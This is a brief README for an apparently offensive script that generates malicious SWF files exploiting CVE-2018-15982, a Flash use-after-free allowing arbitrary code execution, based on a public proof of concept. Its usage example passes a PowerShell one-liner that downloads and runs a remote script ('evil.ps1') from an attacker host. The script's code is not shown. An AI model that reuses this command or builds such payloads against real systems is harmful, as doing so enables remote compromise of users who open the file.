# Adobe Flash CVE-2018-15982

Script to dynamically create swf payload.  

The script creates a swf payload which is based off of the PoC payload from https://github.com/smgorelik/Windows-RCE-exploits.

The vulnerability  is a use-after-free flaw enabling arbitrary code-execution in Flash.  More information can be found here.
https://threatpost.com/adobe-patches-zero-day-vulnerability-in-flash-player/139629/


Usage:
python create_swf.py <command> <output file name>
  
Example:
python create_swf.py "powershell.exe IEX (iwr 'http://192.168.0.32/evil.ps1')" test.swf
